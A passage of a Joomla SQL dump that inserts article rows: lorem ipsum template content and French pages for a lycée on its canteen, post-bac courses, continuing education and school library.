leo. Ut pharetra augue nec augue. Nam elit magna, hendrerit sit amet, tincidunt ac, viverra sed, nulla. Donec porta diam eu massa. Quisque diam lorem, interdum vitae, dapibus ac, scelerisque vitae, pede. </p>\r\n<p>Donec eget tellus non erat lacinia fermentum. Donec in velit vel ipsum auctor pulvinar. Proin ullamcorper urna et felis. Vestibulum iaculis lacinia est. Proin dictum elementum velit. Fusce euismod consequat ante. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Pellentesque sed dolor. Aliquam congue fermentum nisl. Mauris accumsan nulla vel diam. Sed in lacus ut enim adipiscing aliquet. Nulla venenatis. In pede mi, aliquet sit amet, euismod in, auctor ut, ligula. Aliquam dapibus tincidunt metus. Praesent justo dolor, lobortis quis, lobortis dignissim, pulvinar ac, lorem. Vestibulum sed ante. Donec sagittis euismod purus. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis.</p>\r\n<p>Nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Praesent vestibulum molestie lacus. Aenean nonummy hendrerit mauris. Phasellus porta fusce suscipit varius mi. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Nulla dui usce feugiat malesuada odio. Morbi nunc odio, gravida at, cursus nec, luctus a, lorem. Maecenas tristique orci ac sem. Duis ultricies pharetra magna. Donec accumsan malesuada orci. Donec sit amet eros. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Mauris fermentum dictum magna. Sedume laoreet aliquam leo. Ut tellus dolor, dapibus eget, elementum vel, cursus eleifend, elit. Aenean auctor wisi et urna. Aliquam erat volutpat. Duis ac turpis. Integer rutrum ante eu lacus. Quisque nulla. Vestibulum libero nisl, porta vel, scelerisque eget, malesuada at, neque. Vivamus eget nibh. Etiam cursus leo vel metus. Nulla facilisi. Aenean nec eros. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere.</p>\r\n<p>E-mail: <a href="mailto:info@demolink.org">info@demolink.org</a></p>\r\n', '', 2, 0, 0, 7, '2011-08-04 15:27:47', 42, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2011-08-04 15:27:47', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","alternative_readmore":"","article_layout":""}', 1, 0, 8, '', '', 1, 130, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(14, 49, 'Nunc quis est id nisi', 'nunc-quis-est-id-nisi', '', '<p class="art-img"><img src="images/page2-img1.jpg" alt="1" /></p>\r\n<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas facilisis risus sit amet tortor venenatis mollis. Nulla nibh turpis, blandit quis rutrum mollis, dapibus in urna. Duis aliquet, magna sit amet bibendum adipiscing, urna orci adipiscing neque, vitae mollis ante mauris non dui. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Pellentesque quis libero ligula, a aliquet est. Fusce felis nisi, fermentum nec rutrum eu, viverra non libero. Phasellus massa ligula, tempus quis eleifend non, tempor eget libero.</p>\r\n\r\n<p> Nunc quis est id nisi tristique accumsan in sit amet massa. Sed vehicula, urna id vulputate ultricies, massa orci scelerisque erat, a tincidunt massa est ac libero. Sed quis mauris erat, sit amet suscipit justo. Praesent non risus varius mauris ornare pharetra ac vel purus. Vivamus facilisis arcu at nisi semper in aliquam nisl porta. Nulla facilisi. Phasellus tempor fringilla ligula id facilisis. Pellentesque nec orci et diam gravida lacinia nec sed elit. Nullam vel augue turpis, varius imperdiet risus.</p>\r\n<p>\r\nUt at lorem ante. Aliquam consequat scelerisque nunc ac sollicitudin. Fusce quis nisl at nibh suscipit tincidunt. Ut faucibus ipsum a justo laoreet quis interdum orci volutpat. In quam libero, mollis at auctor in, blandit ac arcu. Aenean pretium venenatis purus eleifend molestie. In hac habitasse platea dictumst. Fusce tristique venenatis interdum. Cras scelerisque aliquam magna laoreet mollis. Sed eu neque lacus, bibendum malesuada elit. Cras diam magna, rutrum ut sagittis id, eleifend vel tellus. Duis ullamcorper nisl vitae leo feugiat a dapibus sapien scelerisque. Integer viverra leo nec nunc cursus in viverra arcu placerat. </p>', '', 2, 0, 0, 7, '2011-08-08 11:17:15', 42, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2011-08-08 11:17:14', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","alternative_readmore":"","article_layout":""}', 1, 0, 7, '', '', 1, 4, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(15, 50, 'Ut at lorem ante', 'ut-at-lorem-ante', '', '<p class="art-img"><img src="images/home-img-1.jpg" alt="1" /></p>\r\n<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas facilisis risus sit amet tortor venenatis mollis. Nulla nibh turpis, blandit quis rutrum mollis, dapibus in urna. Duis aliquet, magna sit amet bibendum adipiscing, urna orci adipiscing neque, vitae mollis ante mauris non dui. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Pellentesque quis libero ligula, a aliquet est. Fusce felis nisi, fermentum nec rutrum eu, viverra non libero. Phasellus massa ligula, tempus quis eleifend non, tempor eget libero.</p>\r\n\r\n<p> Nunc quis est id nisi tristique accumsan in sit amet massa. Sed vehicula, urna id vulputate ultricies, massa orci scelerisque erat, a tincidunt massa est ac libero. Sed quis mauris erat, sit amet suscipit justo. Praesent non risus varius mauris ornare pharetra ac vel purus. Vivamus facilisis arcu at nisi semper in aliquam nisl porta. Nulla facilisi. Phasellus tempor fringilla ligula id facilisis. Pellentesque nec orci et diam gravida lacinia nec sed elit. Nullam vel augue turpis, varius imperdiet risus.</p>\r\n<p>\r\nUt at lorem ante. Aliquam consequat scelerisque nunc ac sollicitudin. Fusce quis nisl at nibh suscipit tincidunt. Ut faucibus ipsum a justo laoreet quis interdum orci volutpat. In quam libero, mollis at auctor in, blandit ac arcu. Aenean pretium venenatis purus eleifend molestie. In hac habitasse platea dictumst. Fusce tristique venenatis interdum. Cras scelerisque aliquam magna laoreet mollis. Sed eu neque lacus, bibendum malesuada elit. Cras diam magna, rutrum ut sagittis id, eleifend vel tellus. Duis ullamcorper nisl vitae leo feugiat a dapibus sapien scelerisque. Integer viverra leo nec nunc cursus in viverra arcu placerat. </p>', '', 2, 0, 0, 7, '2011-08-08 11:18:20', 42, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2011-08-08 11:18:20', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","alternative_readmore":"","article_layout":""}', 1, 0, 6, '', '', 1, 1, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', '');
INSERT INTO `jos_content` (`id`, `asset_id`, `title`, `alias`, `title_alias`, `introtext`, `fulltext`, `state`, `sectionid`, `mask`, `catid`, `created`, `created_by`, `created_by_alias`, `modified`, `modified_by`, `checked_out`, `checked_out_time`, `publish_up`, `publish_down`, `images`, `urls`, `attribs`, `version`, `parentid`, `ordering`, `metakey`, `metadesc`, `access`, `hits`, `metadata`, `featured`, `language`, `xreference`) VALUES
(16, 51, 'Aliquam consequat', 'aliquam-consequat', '', '<p class="art-img"><img src="images/page4-img2.jpg" alt="1" /></p>\r\n<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas facilisis risus sit amet tortor venenatis mollis. Nulla nibh turpis, blandit quis rutrum mollis, dapibus in urna. Duis aliquet, magna sit amet bibendum adipiscing, urna orci adipiscing neque, vitae mollis ante mauris non dui. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Pellentesque quis libero ligula, a aliquet est. Fusce felis nisi, fermentum nec rutrum eu, viverra non libero. Phasellus massa ligula, tempus quis eleifend non, tempor eget libero.</p>\r\n\r\n<p> Nunc quis est id nisi tristique accumsan in sit amet massa. Sed vehicula, urna id vulputate ultricies, massa orci scelerisque erat, a tincidunt massa est ac libero. Sed quis mauris erat, sit amet suscipit justo. Praesent non risus varius mauris ornare pharetra ac vel purus. Vivamus facilisis arcu at nisi semper in aliquam nisl porta. Nulla facilisi. Phasellus tempor fringilla ligula id facilisis. Pellentesque nec orci et diam gravida lacinia nec sed elit. Nullam vel augue turpis, varius imperdiet risus.</p>\r\n<p>\r\nUt at lorem ante. Aliquam consequat scelerisque nunc ac sollicitudin. Fusce quis nisl at nibh suscipit tincidunt. Ut faucibus ipsum a justo laoreet quis interdum orci volutpat. In quam libero, mollis at auctor in, blandit ac arcu. Aenean pretium venenatis purus eleifend molestie. In hac habitasse platea dictumst. Fusce tristique venenatis interdum. Cras scelerisque aliquam magna laoreet mollis. Sed eu neque lacus, bibendum malesuada elit. Cras diam magna, rutrum ut sagittis id, eleifend vel tellus. Duis ullamcorper nisl vitae leo feugiat a dapibus sapien scelerisque. Integer viverra leo nec nunc cursus in viverra arcu placerat. </p>', '', 2, 0, 0, 7, '2011-08-08 11:19:08', 42, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2011-08-08 11:19:08', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","alternative_readmore":"","article_layout":""}', 1, 0, 5, '', '', 1, 1, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(17, 52, 'Suspendisse adipiscing', 'suspendisse-adipiscing', '', '<p class="art-img"><img src="images/page6-img1.jpg" alt="1" /></p>\r\n<p>Morbi accumsan quam vitae magna malesuada tincidunt. Duis ut lorem velit, ac interdum quam. Nullam euismod sem sed elit dapibus condimentum. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Morbi eleifend porta lorem, vel sollicitudin turpis luctus eu.</p>\r\n\r\n<p> Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Maecenas porttitor tellus eget mauris suscipit ornare. Proin sed lorem eget mi pellentesque egestas. Quisque est augue, porttitor nec ullamcorper id, tristique ac est. Etiam sapien justo, hendrerit egestas rhoncus non, mattis ut arcu. Nullam lobortis laoreet nunc eu mollis. Nulla placerat adipiscing lorem, nec pellentesque metus luctus at. Proin turpis erat, hendrerit in malesuada vel, accumsan eu felis. Donec nec nisi at est condimentum blandit nec vel ante.</p>\r\n\r\n<p>Suspendisse adipiscing pulvinar est vitae venenatis. Etiam adipiscing quam eget libero fringilla scelerisque. Suspendisse lectus diam, imperdiet ac sodales in, lacinia eleifend erat. Vestibulum cursus accumsan nisi, sed adipiscing ante hendrerit nec. In sapien nibh, iaculis eget bibendum non, tincidunt quis dui. Integer nec diam quis velit posuere auctor. Vivamus fringilla eros a lorem molestie euismod. Donec posuere rutrum nunc eu ornare. Cras ut arcu in lacus sollicitudin elementum nec id velit. Phasellus sodales, augue lacinia mattis volutpat, metus dolor sodales nibh, pulvinar scelerisque urna nunc non nibh. </p>', '', 2, 0, 0, 7, '2011-08-08 11:20:30', 42, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2011-08-08 11:20:30', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","alternative_readmore":"","article_layout":""}', 1, 0, 4, '', '', 1, 2, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(18, 53, 'Principal notes (2)', 'principal-notes-2', '', '<div class="art-columns">\r\n<div class="art-col left"><img src="images/page3-img1.jpg" border="0" alt="1" />\r\n<p class="intro"><a href="#">Laoreetum dolorem magnorempsum.</a></p>\r\n<p>Laoreet dolore magnaorem ipsum dolor sert adipiscing elit sed diam nonummy nibh euismod tincidunt laoreet dolore setsit.</p>\r\n</div>\r\n<div class="art-col right"><img src="images/page3-img2.jpg" border="0" alt="2" />\r\n<p class="intro"><a href="#">Sed ut perspiciatis unde omnis istnat.</a></p>\r\n<p>Adipiscing elit sed diam nonummy nibh euismod tincidunt laoreet dolore setsitamet consectetuer adipiscing elit sed diam.</p>\r\n</div>\r\n</div>\r\n<div class="art-columns">\r\n<div class="art-col left"><img src="images/page3-img3.jpg" border="0" alt="3" />\r\n<p class="intro"><a href="#">Sed ut perspiciatis unde omnis istnat.</a></p>\r\n<p>Adipiscing elit sed diam nonummy nibh euismod tincidunt laoreet dolore setsitamet consectetuer adipiscing elit sed diam.</p>\r\n</div>\r\n<div class="art-col right"><img src="images/page3-img4.jpg" border="0" alt="4" />\r\n<p class="intro"><a href="#">Laoreetum dolorem magnorempsum.</a></p>\r\n<p>Laoreet dolore magnaorem ipsum dolor sert adipiscing elit sed diam nonummy nibh euismod tincidunt laoreet dolore setsit.</p>\r\n</div>\r\n</div>', '', 2, 0, 0, 7, '2011-07-18 05:25:26', 42, '', '2011-08-12 05:12:43', 0, 0, '0000-00-00 00:00:00', '2011-07-18 05:25:26', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 3, '', '', 1, 0, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(20, 56, 'restauration', 'restauration', '', '<p style="text-align: justify; color: #000000;">Tout élève inscrit au lycée peut prendre ses repas au Restaurant Universitaire du CROUS, sur le campus.</p>\r\n<div style="text-align: justify; color: #000000;"> </div>\r\n<p style="text-align: justify; color: #000000;">C''est un self-service ouvert de 11h15 à 13h45, avec menus à la carte où vous avez le choix entre Pizzeria, Régions du monde et Grilladerie (1er étage).</p>\r\n<div style="text-align: justify; color: #000000;"> </div>\r\n<p style="text-align: justify; color: #000000;">Un restaurant traditionnel aux menus variés se tient au 2ème étage.</p>\r\n<div style="text-align: justify; color: #000000;"> </div>\r\n<p style="text-align: justify; color: #000000;">Une cafétéria est aussi à votre disposition, ouverte de 10h30 à 14h30.</p>\r\n<div style="text-align: justify; color: #000000;"> </div>\r\n<p style="text-align: justify; color: #000000;">Vous pouvez régler vos repas par chèques, en espèce ou directement au restaurant universitaire et à la cafétéria grâce à la carte Monéo qui vous a été distribuée.</p>\r\n<p style="color: #000000; text-align: center;"><img src="http://www.lms.ens-cachan.fr/moneo.jpg" border="0" alt="Monéo" style="width: 86px; height: 69px;" /></p>\r\n<p style="text-align: justify; color: #000000;"> </p>\r\n<div style="text-align: justify; color: #000000;"> </div>\r\n<p style="text-align: justify; color: #000000;">En cas de perte ou de vol, vous pouvez obtenir une nouvelle carte. Renseignez vous auprès des caisses du CROUS.</p>\r\n<div style="text-align: justify; color: #000000;"> </div>\r\n<p style="text-align: justify;"><span style="color: #000000;">Attention : Le solde de votre carte perdue ou volée ne pourra vous être remboursé. Le renouvellement de la carte est payant. Vous pouvez charger votre carte par carte bancaire sur les bornes affichants le sigle Monéo (cafétérias, bureaux de poste…) La carte fonctionne aussi chez les commerçants équipés.</span></p>\r\n<p class="desc"> </p>', '', -2, 0, 0, 13, '2012-10-29 15:54:48', 390, '', '2012-10-29 17:39:25', 390, 0, '0000-00-00 00:00:00', '2012-10-29 15:54:48', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 4, 0, 0, '', '', 1, 27, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(22, 58, 'Etudes post-Bac', 'etudes-post-bac', '', '<h2>Etudes Post-BAC</h2>\r\n<p><a href="50-les-sections-de-bts">- Les sections de BTS  </a><br /><br /><a href="http://www.lms.ens-cachan.fr/brochures%20pdf/fiche%20web%20%20cpge%20d-e%20%284%29.pdf">- Classe préparatoire économique commerciale et juridique</a><br /><br /><a href="http://www.lms.ens-cachan.fr/brochures%20pdf/fiche%20web%20%20dcg.pdf">- DCG - Diplôme de Comptabilité et de Gestion </a>(Licence en 3 ans)</p>', '', -2, 0, 0, 2, '2012-10-29 16:07:19', 390, '', '2013-03-14 13:20:33', 390, 0, '0000-00-00 00:00:00', '2012-10-29 16:07:19', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 5, 0, 9, '', '', 1, 306, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(23, 59, 'Etudes post-Bts', 'etudes-post-bts', '', '<h2>Etudes Post-BTS</h2>\r\n<p align="center"><img src="http://www.lms.ens-cachan.fr/images/imagescaptvy5v.jpg" border="0" width="114" height="107" /></p>\r\n<p align="center"> </p>\r\n<p style="color: #009900;" align="center"><a href="http://www.lms.ens-cachan.fr/brochures%20pdf/fiche%20web%20%20licence%20pro%20ci.pdf" target="_blank">La Licence "Echanges Internationaux"</a></p>\r\n<p> </p>\r\n<p align="center"> </p>\r\n<p align="center">__________________________</p>\r\n<p> </p>\r\n<p align="center"><img src="http://www.lms.ens-cachan.fr/images/compta.jpg" border="0" width="104" height="104" /></p>\r\n<p align="center"> </p>\r\n<p align="center"><a href="http://www.lms.ens-cachan.fr/brochures%20pdf/fiche%20web%20%20dcg.pdf" target="_blank">Licence "Diplôme de Comptabilité et de Gestion"</a></p>\r\n<p align="center"> </p>\r\n<p align="center"> </p>\r\n<p align="center">__________________________</p>\r\n<p align="center"> </p>\r\n<p align="center"><img src="http://www.lms.ens-cachan.fr/images/cesf.jpg" border="0" width="98" height="91" /></p>\r\n<p align="center"> </p>\r\n<p align="center"><a href="http://www.lms.ens-cachan.fr/brochures%20pdf/fiche%20web%20%20cesf.pdf" target="_blank">Diplôme de Conseiller en Economie Sociale et Familiale</a></p>', '', -2, 0, 0, 2, '2012-10-29 16:07:36', 390, '', '2012-11-06 16:04:53', 390, 0, '0000-00-00 00:00:00', '2012-10-29 16:07:36', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 2, 0, 8, '', '', 1, 215, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(24, 60, 'Formation en alternance', 'formation-en-alternance', '', '<p>Formation des visiteurs médicaux</p>\r\n<p><a href="http://www.lms.ens-cachan.fr/brochures%20pdf/fiche%20web%20%20vm.pdf" target="_blank"><img src="http://www.lms.ens-cachan.fr/VisiteurMedical.gif" border="0" alt="Visiteur médical" style="border: 0px solid; width: 200px; height: 82px;" /></a></p>', '', -2, 0, 0, 2, '2012-10-29 16:08:26', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2012-10-29 16:08:26', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 7, '', '', 1, 6, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(25, 61, 'Formation Continue', 'formation-continue', '', '<p style="color: #000000;">Se renseigner auprès de l''ECOLE NORMALE SUPERIEURE DE CACHAN</p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;">FORMATION CONTINUE ET DEVELOPPEMENT</p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"><a href="http://www.fcd.ens-cachan.fr/%20" target="_blank">www.fcd.ens-cachan.fr</a></p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;">INGÉNIERIE ET ADMINISTRATION DES RÉSEAUX INFORMATIQUES - 700 heures de formation au Centre et 210 heures de mission en entreprise.</p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;">PREPARATION DES CERTIFICATIONS PROFESSIONNELLES CISCO, MICROSOFT, SUSE, NOVELL<br /> <a href="http://www.cisco.com/web/FR/index.html" target="_blank"><img src="http://www.lms.ens-cachan.fr/cisco.jpg" border="0" alt="Cisco" style="border: 0px solid; width: 79px; height: 49px;" /></a> <a href="http://www.microsoft.com/fr-fr/default.aspx" target="_blank"><img src="http://www.lms.ens-cachan.fr/microsoft.jpg" border="0" alt="Microsoft" style="border: 0px solid; width: 82px; height: 46px;" /></a> <a href="http://fr.opensuse.org/Bienvenue_sur_openSUSE.org" target="_blank"><img src="http://www.lms.ens-cachan.fr/images/suse.jpg" border="0" alt="Suse" style="border: 0px solid; width: 71px; height: 65px;" /></a> <a href="http://www.novell.com/fr-fr/home/" target="_blank"><img src="http://www.lms.ens-cachan.fr/novell.jpg" border="0" alt="Novell" style="border: 0px solid; width: 69px; height: 63px;" /></a></p>', '', -2, 0, 0, 2, '2012-10-29 16:08:49', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2012-10-29 16:08:49', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 6, '', '', 1, 3, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(26, 63, 'Présentation du CDI', 'presentation-du-cdi', '', '<p style="text-align: left;" align="center"><img src="images/1.jpg" border="0" alt="" /></p>\r\n<p>Installé au 3ème étage en salle 301 et 303, le CDI est commun aux professeurs et aux élèves. C’est un espace de travail où les élèves du lycée peuvent se rendre seuls ou accompagnés d’un professeur.<br /> C’est un lieu de ressources multimédia où chacun pourra se documenter, s’informer ou lire.</p>\r\n<p style="text-align: left;">email : doc@lms.ens-cachan.fr</p>\r\n<div style="text-align: left;">tél : 01 47 40 49 81 / fax : 01 47 40 49 40</div>\r\n<p style="text-align: left;"><span><strong><em>Ce que l’on trouve au CDI:</em></strong></span></p>\r\n<p style="text-align: left;" align="center"><img src="images/4.jpg" border="0" style="border: 0;" /></p>\r\n<p style="text-align: left;" align="center">Des <span style="font-weight: bold;">usuels</span> (dictionnaires, encyclopédies):<br /> Pour chercher une définition, rédiger une biographie...</p>\r\n<p style="text-align: left;" align="center"><img src="http://www.lms.ens-cachan.fr/images/5.jpg" border="0" width="180" height="151" /></p>\r\n<p style="text-align: left;" align="center">Des <span style="font-weight: bold;">documentaires</span> : Livres concernant un ou plusieurs sujets. Ils sont rangés selon les 10 grandes classes de la classification DEWEY. Chaque livre porte au dos une cote (un numéro et 3 lettres), le numéro est l’indice DEWEY , Les lettres sont les 3 premières lettres du nom de l’auteur.</p>\r\n<p style="text-align: left;" align="center">Des <span style="font-weight: bold;">bandes dessinées</span> : elles sont rangées dans des bacs</p>\r\n<p style="text-align: left;" align="center"><img src="http://www.lms.ens-cachan.fr/images/7.jpg" border="0" width="209" height="132" /></p>\r\n<p style="text-align: left;" align="center">Des <span style="font-weight: bold;">ouvrages littéraires</span> : Romans , poésie, théâtre, biographies. Ils sont classés par ordre alphabétique de noms d’auteur (r pour roman, p pour poésie, t pour théâtre, b pour biographie).</p>\r\n<p style="text-align: left;"> </p>\r\n<p style="text-align: left;" align="center"><img src="http://www.lms.ens-cachan.fr/images/9.jpg" border="0" width="164" height="154" /></p>\r\n<p style="text-align: left;" align="center">Des <span style="font-weight: bold;">périodiques</span> : Le CDI est abonné à de nombreux périodiques français et étrangers : un quotidien (Le Monde), des hebdomadaires (Courrier international, The Economist…), des mensuels (Capital, Géo, L’Histoire, L’Etudiant, La Recherche...).</p>\r\n<p style="text-align: left;" align="center"><a href="http://www.lms.ens-cachan.fr/CDIperiodiques2012.htm" target="_blank"><span style="font-size: medium;"><strong>Liste des abonnements 2012</strong></span></a></p>\r\n<p style="text-align: left;" align="center"><img src="http://www.lms.ens-cachan.fr/images/12.jpg" border="0" width="345" height="221" /></p>\r\n<ul style="text-align: left;">\r\n<li>Un <span style="font-weight: bold;">espace orientation</span> : le kiosque ONISEP (sur les études et les métiers) ainsi que les fichiers du CIDJ ( qui proposent aussi des informations sur les loisirs).</li>\r\n<li>Des <span style="font-weight: bold;">manuels scolaires</span> : Ils sont rangés par discipline.</li>\r\n<li>Un <span style="font-weight: bold;">espace d’informations culturelles</span> : Une documentation sur les voyages, les spectacles, les expositions, les loisirs …</li>\r\n</ul>\r\n<p style="text-align: left;"><img src="http://www.lms.ens-cachan.fr/images/13.jpg" border="0" width="283" height="164" /></p>\r\n<ul style="text-align: left;">\r\n<li><span style="font-weight: bold;">L’espace informatique</span> : six postes reliés au réseau Novell de l’établissement sont à votre disposition. Pour vos recherches documentaires, vous pouvez utiliser notre logiciel documentaire BCDI ou vous connecter à Internet. D’autres logiciels (Word, Excel …) ou l’encyclopédie Universalis sont également en libre accès sur le réseau Novell. Des initiations à l’utilisation de BCDI sont proposées au premier trimestre pour les nouveaux élèves de Seconde. Pour vous connecter au réseau Novell, vous devez vous identifier. En cas de problème lors de la procédure de login n’hésitez pas à demander notre <a href="http://www.lms.ens-cachan.fr/aide.htm" target="_blank">aide</a>.</li>\r\n<li>Des <span style="font-weight: bold;">documents audiovisuels</span> : K7 audio et vidéo, DVD...</li>\r\n<li>Du <span style="font-weight: bold;">matériel pour les professeurs</span> : des magnétophones, des lecteurs de CD audio, des rétroprojecteurs, un projecteur de diapositives, un téléviseur avec magnétoscope sur table roulante.</li>\r\n</ul>\r\n<p> </p>\r\n<p> </p>\r\n<p> </p>', '', -2, 0, 0, 11, '2012-10-29 16:09:59', 390, '', '2016-06-08 12:28:01', 390, 0, '0000-00-00 00:00:00', '2012-10-29 16:09:59', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 13, 0, 1, '', '', 1, 56, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
